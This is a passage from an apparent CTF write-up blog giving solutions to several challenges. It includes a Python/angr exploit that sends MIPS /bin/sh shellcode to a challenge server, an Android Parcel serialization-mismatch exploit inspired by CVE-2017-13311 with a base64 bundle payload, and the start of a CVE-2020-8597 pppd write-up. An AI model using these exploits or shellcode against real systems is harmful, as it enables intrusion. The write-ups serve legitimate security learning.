class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">                    <span class="keyword">if</span>(hashlib.sha256(chr(a)+chr(b)+chr(c)).hexdigest()==res):</span><br><span class="line">                        p.sendlineafter(<span class="string">"&gt;\n"</span>,chr(a)+chr(b)+chr(c))</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"???"</span></span><br><span class="line">   </span><br><span class="line"><span class="comment">######################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span>):</span><br><span class="line">        ret=subprocess.Popen(<span class="string">"rm -rf ./1"</span>.split(<span class="string">" "</span>))</span><br><span class="line">        ret.wait()</span><br><span class="line">        ret=subprocess.Popen(<span class="string">"rm -rf ./1.gz"</span>.split(<span class="string">" "</span>))</span><br><span class="line">        ret.wait()</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># start</span></span><br><span class="line">        p=remote(<span class="string">'106.53.114.216'</span>,<span class="number">9999</span>)</span><br><span class="line">        do_pow()</span><br><span class="line">        <span class="comment">#get binart</span></span><br><span class="line">        p.readuntil(<span class="string">"="</span>*<span class="number">15</span>+<span class="string">"\n"</span>)</span><br><span class="line">        data=p.readuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">        f=open(<span class="string">"./"</span>+str(<span class="number">1</span>)+<span class="string">".gz"</span>,<span class="string">"w+"</span>)</span><br><span class="line">        data=base64.b64decode(data)</span><br><span class="line">        f.write(data)</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="comment"># get finished</span></span><br><span class="line">        ret=subprocess.Popen(<span class="string">"gunzip ./1.gz"</span>.split(<span class="string">" "</span>))</span><br><span class="line">        ret.wait()</span><br><span class="line">        ret=subprocess.Popen(<span class="string">"chmod +x ./1"</span>.split(<span class="string">" "</span>))</span><br><span class="line">        ret.wait()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=process(<span class="string">"qemu-mipsel -L /usr/mipsel-linux-gnu/ ./1"</span>.split(<span class="string">" "</span>))</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span>):</span><br><span class="line">        func=analys()</span><br><span class="line">        payload=<span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> func:</span><br><span class="line">            <span class="keyword">if</span>(len(_)&gt;=<span class="number">109</span>*<span class="number">4</span>):<span class="comment"># certain</span></span><br><span class="line">                payload=type_1(_)+payload</span><br><span class="line">            <span class="keyword">elif</span> (len(_)&lt;=<span class="number">49</span>*<span class="number">4</span> <span class="keyword">and</span> len(_)&gt;=<span class="number">47</span>*<span class="number">4</span>):<span class="comment"># s[0]:1/3 times</span></span><br><span class="line">                payload=type_2(_)+payload</span><br><span class="line">            <span class="keyword">elif</span> (len(_)==<span class="number">74</span>*<span class="number">4</span>):<span class="comment"># certain</span></span><br><span class="line">                payload=type_3(_)+payload</span><br><span class="line">            <span class="keyword">elif</span> (len(_)&gt;=<span class="number">76</span>*<span class="number">4</span> <span class="keyword">and</span> len(_)&lt;=<span class="number">80</span>*<span class="number">4</span>):<span class="comment"># s[0]:1/3/5 times</span></span><br><span class="line">                payload=type_4(_)+payload</span><br><span class="line">            <span class="keyword">elif</span> (len(_)&gt;=<span class="number">63</span>*<span class="number">4</span> <span class="keyword">and</span> len(_)&lt;=<span class="number">66</span>*<span class="number">4</span>): <span class="comment">#s[0] 1/4/3 times</span></span><br><span class="line">                payload=type_5(_)+payload</span><br><span class="line">            <span class="keyword">elif</span> (len(_)&gt;=<span class="number">42</span>*<span class="number">4</span> <span class="keyword">and</span> len(_)&lt;=<span class="number">44</span>*<span class="number">4</span>):</span><br><span class="line">                payload=type_6(_)+payload</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> len(_)/<span class="number">4</span></span><br><span class="line">                <span class="keyword">print</span> (_)</span><br><span class="line">                print(<span class="string">"Ouch! An erron was detected!"</span>)</span><br><span class="line">        get_flag(payload)</span><br><span class="line">       </span><br><span class="line">    ret=subprocess.Popen(<span class="string">"rm -rf ./1*"</span>.split(<span class="string">" "</span>))</span><br><span class="line">    ret.wait()</span><br></pre></td></tr></table></figure></p>
<h4><span id="angr">Angr</span></h4>
<p>I expected that it could be solved within two seconds, however, I found that it could not succeed in about 1.3 seconds during the game. This mythod which takes 1.5s is a little slower but I think this one is better.（abs checker needs z3） Exploit comes from MozhuCY@Nu1L and Mr.R@Nu1L .</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">'angr'</span>).setLevel(<span class="string">'ERROR'</span>)</span><br><span class="line">logging.getLogger(<span class="string">'angr.analyses'</span>).setLevel(<span class="string">'ERROR'</span>)</span><br><span class="line">logging.getLogger(<span class="string">'pwnlib.asm'</span>).setLevel(<span class="string">'ERROR'</span>)</span><br><span class="line">logging.getLogger(<span class="string">'angr.analyses.disassembly_utils'</span>).setLevel(<span class="string">'ERROR'</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"ERROR"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow</span><span class="params">(hash)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">                tmp = chr(i)+chr(j)+chr(k)</span><br><span class="line">                <span class="keyword">if</span> hash == hashlib.sha256(tmp).hexdigest():</span><br><span class="line">                    <span class="keyword">print</span> tmp</span><br><span class="line">                    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="comment">#21190da8c2a736569d9448d950422a7a a1 &lt; a2</span></span><br><span class="line"><span class="comment">#2a1fae6743ccdf0fcaf6f7af99e89f80 a2 &lt;= a1</span></span><br><span class="line"><span class="comment">#8342e17221ff79ac5fdf46e63c25d99b a1 &lt; a2</span></span><br><span class="line"><span class="comment">#51882b30d7af486bd0ab1ca844939644 a2 &lt;= a1</span></span><br><span class="line">tb = &#123;</span><br><span class="line">    <span class="string">"6aa134183aee6a219bd5530c5bcdedd7"</span>:&#123;</span><br><span class="line">        <span class="string">'21190da8c2a736569d9448d950422a7a'</span>:&#123;</span><br><span class="line">            <span class="string">'8342e17221ff79ac5fdf46e63c25d99b'</span>:<span class="string">"\xed\xd1\xda\x33"</span>,</span><br><span class="line">            <span class="string">'51882b30d7af486bd0ab1ca844939644'</span>:<span class="string">"\x87\x6e\x45\x82"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">'2a1fae6743ccdf0fcaf6f7af99e89f80'</span>:&#123;</span><br><span class="line">            <span class="string">'51882b30d7af486bd0ab1ca844939644'</span>:<span class="string">'\xb7\x13\xdf\x8d'</span>,</span><br><span class="line">            <span class="string">'8342e17221ff79ac5fdf46e63c25d99b'</span>:<span class="string">'\x2f\x0f\x2c\x02'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"745482f077c4bfffb29af97a1f3bd00a"</span>:&#123;</span><br><span class="line">        <span class="string">'21190da8c2a736569d9448d950422a7a'</span>:&#123;</span><br><span class="line">            <span class="string">'51882b30d7af486bd0ab1ca844939644'</span>:<span class="string">"\x57\xcf\x81\xe7"</span>,</span><br><span class="line">            <span class="string">'8342e17221ff79ac5fdf46e63c25d99b'</span>:<span class="string">"\x80\xbb\xdf\xb1"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">'2a1fae6743ccdf0fcaf6f7af99e89f80'</span>:&#123;</span><br><span class="line">            <span class="string">'51882b30d7af486bd0ab1ca844939644'</span>:<span class="string">"\x95\x3e\xf7\x4e"</span>,</span><br><span class="line">            <span class="string">'8342e17221ff79ac5fdf46e63c25d99b'</span>:<span class="string">"\x1a\xc3\x00\x92"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"610a69b424ab08ba6b1b2a1d3af58a4a"</span>:&#123;</span><br><span class="line">        <span class="string">'21190da8c2a736569d9448d950422a7a'</span>:&#123;</span><br><span class="line">            <span class="string">'51882b30d7af486bd0ab1ca844939644'</span>:<span class="string">"\xfb\xef\x2b\x2f"</span>,</span><br><span class="line">            <span class="string">'8342e17221ff79ac5fdf46e63c25d99b'</span>:<span class="string">"\x10\xbd\x00\xac"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">'2a1fae6743ccdf0fcaf6f7af99e89f80'</span>:&#123;</span><br><span class="line">            <span class="string">'51882b30d7af486bd0ab1ca844939644'</span>:<span class="string">'\xbd\x7a\x55\xd3'</span>,</span><br><span class="line">            <span class="string">'8342e17221ff79ac5fdf46e63c25d99b'</span>:<span class="string">'\xbc\xbb\xff\x4a'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"b93e4feb8889770d981ef5c24d82b6cc"</span>:&#123;</span><br><span class="line">        <span class="string">'21190da8c2a736569d9448d950422a7a'</span>:&#123;</span><br><span class="line">            <span class="string">'51882b30d7af486bd0ab1ca844939644'</span>:<span class="string">"\x2f\xfb\xef\x2b"</span>,</span><br><span class="line">            <span class="string">'8342e17221ff79ac5fdf46e63c25d99b'</span>:<span class="string">"\xac\x10\xbd\x00"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">'2a1fae6743ccdf0fcaf6f7af99e89f80'</span>:&#123;</span><br><span class="line">            <span class="string">'8342e17221ff79ac5fdf46e63c25d99b'</span>:<span class="string">'\x4a\xbc\xbb\xff'</span>,</span><br><span class="line">            <span class="string">'51882b30d7af486bd0ab1ca844939644'</span>:<span class="string">'\xd3\xbd\x7a\x55'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># hd = [i.start()for i in re.finditer("e0ffbd27".decode("hex"),f)]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findhd</span><span class="params">(addr)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        code = f[addr:addr + <span class="number">4</span>]</span><br><span class="line">        <span class="keyword">if</span>(code == <span class="string">"e0ffbd27"</span>.decode(<span class="string">"hex"</span>)):</span><br><span class="line">            <span class="keyword">return</span> addr</span><br><span class="line">        addr -= <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dejmp</span><span class="params">(code)</span>:</span></span><br><span class="line">    c = <span class="string">""</span></span><br><span class="line">    d = Cs(CS_ARCH_MIPS,CS_MODE_MIPS32)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> d.disasm(code,<span class="number">0</span>):</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"b"</span> <span class="keyword">in</span> i.mnemonic <span class="keyword">or</span> <span class="string">"j"</span> <span class="keyword">in</span> i.mnemonic):</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">        <span class="comment">#print("0x%x:\t%s\t%s"%(i.address,i.mnemonic,i.op_str))</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">            c += code[i.address:i.address+<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="comment"># @func_set_timeout(1)</span></span><br><span class="line"><span class="comment"># @timeout_decorator.timeout(1)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(func_addr,find,avoid)</span>:</span></span><br><span class="line">    <span class="comment"># p = angr.Project(filename,auto_load_libs = False)</span></span><br><span class="line">    start_address = func_addr</span><br><span class="line">    state = p.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">    tmp_addr = <span class="number">0x20000</span></span><br><span class="line"></span><br><span class="line">    ans = claripy.BVS(<span class="string">'ans'</span>, <span class="number">4</span> * <span class="number">8</span>)</span><br><span class="line">    state.memory.store(tmp_addr, ans)</span><br><span class="line">    state.regs.a0 = <span class="number">0x20000</span></span><br><span class="line"></span><br><span class="line">    sm = p.factory.simgr(state)</span><br><span class="line">    sm.explore(find=find,avoid=avoid)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sm.found:</span><br><span class="line">        solution_state = sm.found[<span class="number">0</span>]</span><br><span class="line">        solution = solution_state.se.eval(ans)<span class="comment">#,cast_to=str)</span></span><br><span class="line">        <span class="comment"># print(hex(solution))</span></span><br><span class="line">        <span class="keyword">return</span> p32(solution)[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Calc</span><span class="params">(func_addr,find,avoid)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tmp1 = hashlib.md5(dejmp(f[avoid - <span class="number">0x80</span>:avoid])).hexdigest()</span><br><span class="line">        tmp2 = hashlib.md5(f[avoid<span class="number">-0xdc</span>:avoid<span class="number">-0xdc</span>+<span class="number">4</span>]).hexdigest()</span><br><span class="line">        tmp3 = hashlib.md5((f[avoid - <span class="number">0x24</span>:avoid<span class="number">-0x20</span>])).hexdigest()</span><br><span class="line">        <span class="keyword">return</span> tb[tmp1][tmp2][tmp3]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ret = calc(func_addr + base,find + base,avoid + base)</span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"%s %s %s %x"</span>%(tmp1,tmp2,tmp3,func_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># calc(0x401b34,0x401978,0x401c48)</span></span><br><span class="line"><span class="comment"># calc(0x401978,0x401b08,0x401b18)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if __name__=="__main__":</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.system(<span class="string">"rm out.gz"</span>)</span><br><span class="line">        os.system(<span class="string">"rm out"</span>)</span><br><span class="line">        r = remote(<span class="string">"106.53.114.216"</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">        r.recvline()</span><br><span class="line">        sha = r.recvline()</span><br><span class="line">        sha = sha.split(<span class="string">"\""</span>)[<span class="number">1</span>]</span><br><span class="line">        s = pow(sha)</span><br><span class="line">        r.sendline(s)</span><br><span class="line"></span><br><span class="line">        log.success(<span class="string">"pass pow"</span>)</span><br><span class="line">        r.recvuntil(<span class="string">"===============\n"</span>)</span><br><span class="line">        dump = r.recvline()</span><br><span class="line"></span><br><span class="line">        log.success(<span class="string">"write gz"</span>)</span><br><span class="line"></span><br><span class="line">        o = open(<span class="string">"out.gz"</span>,<span class="string">"wb"</span>)</span><br><span class="line">        o.write(dump.decode(<span class="string">"base64"</span>))</span><br><span class="line">        o.close()</span><br><span class="line"></span><br><span class="line">        log.success(<span class="string">"gunzip"</span>)</span><br><span class="line">        os.system(<span class="string">"gzip -d out.gz"</span>)</span><br><span class="line">        os.system(<span class="string">"chmod 777 out"</span>)</span><br><span class="line">        <span class="comment"># r = remote("127.0.0.1",8088)</span></span><br><span class="line">        log.success(<span class="string">"angr"</span>)</span><br><span class="line">        <span class="comment"># filename = "./1294672722"</span></span><br><span class="line">        filename = <span class="string">"out"</span></span><br><span class="line">        base = <span class="number">0x400000</span></span><br><span class="line">        p = angr.Project(filename,auto_load_libs = <span class="keyword">False</span>)</span><br><span class="line">        f = open(filename,<span class="string">"rb"</span>).read()</span><br><span class="line">        final = <span class="number">0xb30</span></span><br><span class="line"></span><br><span class="line">        vd = [i.start()<span class="keyword">for</span> i <span class="keyword">in</span> re.finditer(<span class="string">"25100000"</span>.decode(<span class="string">"hex"</span>),f)]</span><br><span class="line">        vd = vd[::<span class="number">-1</span>]</span><br><span class="line">        chk = <span class="string">""</span></span><br><span class="line">        n = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(vd) - <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span>(vd[i] &lt;= <span class="number">0x2000</span>):</span><br><span class="line">                n += <span class="number">1</span></span><br><span class="line">                func = findhd(vd[i])</span><br><span class="line">                find = findhd(vd[i + <span class="number">1</span>])</span><br><span class="line">                avoid = vd[i]</span><br><span class="line">                ret = Calc(func,find,avoid)</span><br><span class="line">                <span class="comment"># print ret</span></span><br><span class="line">                chk += ret</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line">        func = findhd(vd[len(vd) - <span class="number">1</span>])</span><br><span class="line">        find = final</span><br><span class="line">        avoid = vd[len(vd) - <span class="number">1</span>]</span><br><span class="line">        ret = Calc(func,find,avoid)</span><br><span class="line">        <span class="comment"># print ret</span></span><br><span class="line">        chk += ret</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> chk.encode(<span class="string">"hex"</span>)</span><br><span class="line">        <span class="comment"># chk = 'f1223fb171a0e700f3447552d3bd7a55a1f0a2f300809c0046e5fd5ed12c9696000000be961a961a00a420e60cf4f00800060000e54961e3a366c9acd3bd7a55'</span></span><br><span class="line">        <span class="comment"># chk = chk.decode('hex')</span></span><br><span class="line">        r.recvuntil(<span class="string">"Faster"</span>)</span><br><span class="line">        r.sendafter(<span class="string">"&gt;"</span>,chk)</span><br><span class="line">        context.arch = <span class="string">'mips'</span></span><br><span class="line">        success(r.recvuntil(<span class="string">"Name"</span>))</span><br><span class="line">        r.sendafter(<span class="string">"&gt;"</span>,<span class="string">"g"</span>*<span class="number">8</span>)</span><br><span class="line">        ret_addr = vd[<span class="number">1</span>]<span class="number">-0x34</span><span class="number">-0x240</span>+base</span><br><span class="line">        success(hex(ret_addr))</span><br><span class="line">        shellcode = <span class="string">'la $v1,&#123;&#125;;'</span>.format(hex(ret_addr))</span><br><span class="line">        shellcode += <span class="string">'jr $v1;'</span></span><br><span class="line">        shellcode = asm(shellcode)</span><br><span class="line">        print(shellcode.encode(<span class="string">'hex'</span>))</span><br><span class="line">        r.sendafter(<span class="string">"&gt;"</span>,shellcode)</span><br><span class="line">        r.sendafter(<span class="string">"Faster &gt; "</span>,chk)</span><br><span class="line">        success(r.recvuntil(<span class="string">"Name"</span>))</span><br><span class="line">        r.sendafter(<span class="string">"&gt;"</span>,<span class="string">"gg"</span>)</span><br><span class="line">        shellcode = <span class="string">''</span></span><br><span class="line">        shellcode += <span class="string">"\xff\xff\x06\x28"</span></span><br><span class="line">        shellcode += <span class="string">"\xff\xff\xd0\x04"</span></span><br><span class="line">        shellcode += <span class="string">"\xff\xff\x05\x28"</span></span><br><span class="line">        shellcode += <span class="string">"\x01\x10\xe4\x27"</span></span><br><span class="line">        shellcode += <span class="string">"\x0f\xf0\x84\x24"</span></span><br><span class="line">        shellcode += <span class="string">"\xab\x0f\x02\x24"</span></span><br><span class="line">        shellcode += <span class="string">"\x0c\x01\x01\x01"</span></span><br><span class="line">        shellcode += <span class="string">"/bin/sh"</span></span><br><span class="line">        print(len(shellcode))</span><br><span class="line">        r.sendafter(<span class="string">"&gt;"</span>,shellcode)</span><br><span class="line">        r.interactive()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br></pre></td></tr></table></figure>
<h2><span id="broadcasttest">BroadCastTest</span></h2>
<p>This chall is an android pwn The vulnerability is about the mismatch between serialization and deserialization This chall is mainly inspired by CVE-2017-13311, etc.</p>
<p>You can read this article https://weekly-geekly.github.io/articles/457558/index.html, which details the cause of similar vulnerabilities</p>
<p>In the apk, it first read the Base64 string, then base64decode the data and put it as a Bundle in the broadcast, send it to Receiver2 Receiver2 receives the broadcast, takes out the Bundle, and then takes out a string which key is "command" from the bundle, and determines whether it is getflag, If not, the Receiver2 will continue to broadcast the data to Receiver3 Receiver3 receives the broadcast, takes out the Bundle, check whether the command is getflag, if so, it outputs "Congratulation"</p>
<p>We cannot pass this check in a normal way, but there is a com.de1ta.broadcasttest.MainActivity $ Message class in the apk, where the serialization and deserialization do not match</p>
<p>In Receiver2, checking whether the command is "getflag" will cause the Bundle to be deserialized. When it is sent to Receiver3, it will be serialized again. Finally, Receiver3 will perform the last deserialization after receiving the Bundle.</p>
<p>Using the vulnerability, the string whose key is command cannot be obtained when it is deserialized in Receiver2. After serialization, the string with key as command and the value of getflag appears, and then the check of Receiver3 can pass, and finally get To flag</p>
<p>Below is the exp <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import base64</span><br><span class="line">from hashlib import sha256</span><br><span class="line">import itertools</span><br><span class="line">import string</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">def proof_of_work(chal):</span><br><span class="line">    #for i in itertools.permutations(string.ascii_letters+string.digits, 4):</span><br><span class="line">    for i in itertools.permutations([chr(i) for i in range(256)], 4):</span><br><span class="line">        sol = &apos;&apos;.join(i)</span><br><span class="line">        if sha256(chal + sol).digest().startswith(&apos;\0\0\0&apos;):</span><br><span class="line">            return sol</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = &apos;SAEAAEJOREwDAAAACAAAAG0AaQBzAG0AYQB0AGMAaAAAAAAABAAAACwAAABjAG8AbQAuAGQAZQAxAHQAYQAuAGIAcgBvAGEAZABjAGEAcwB0AHQAZQBzAHQALgBNAGEAaQBuAEEAYwB0AGkAdgBpAHQAeQAkAE0AZQBzAHMAYQBnAGUAAAAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAwAAAA0AAAA0AAAADQAAAAAAAAAHAAAAYwBvAG0AbQBhAG4AZAAAAAAAAAAHAAAAZwBlAHQAZgBsAGEAZwAAAAcAAABjAG8AbQBtAGEAbgBkAAAAAAAAAA0AAABQAGEAZABkAGkAbgBnAC0AVgBhAGwAdQBlAAAA&apos;</span><br><span class="line">b = base64.b64decode(a)</span><br><span class="line">p = remote(&apos;206.189.186.98&apos;, 8848)</span><br><span class="line">p.recvuntil(&apos;chal= &apos;)</span><br><span class="line">chal = p.recvuntil(&apos;\n&apos;)[:-1]</span><br><span class="line">p.recvuntil(&apos;&gt;&gt;\n&apos;)</span><br><span class="line">sol = proof_of_work(chal)</span><br><span class="line">p.send(sol)</span><br><span class="line">p.recvuntil(&apos;size&apos;)</span><br><span class="line">p.sendline(str(len(b)))</span><br><span class="line">p.recvuntil(&apos;please input payload:&apos;)</span><br><span class="line">p.send(b)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h2><span id="pppd">pppd</span></h2>
<p>This challenge is required to write 1 day exp of CVE-2020-8597 This cve itself is actually very simple, just a stack overflow But the difficulty is to communicate with pppd and debug under the mips environment</p>
<p>Most of the teams did not find a way to communicate with pppd during the game, so I directly released the hint and used socat to communicate with pppd</p>
<p>Next is how to debug</p>
<p>First of all, the network is diabled by default</p>
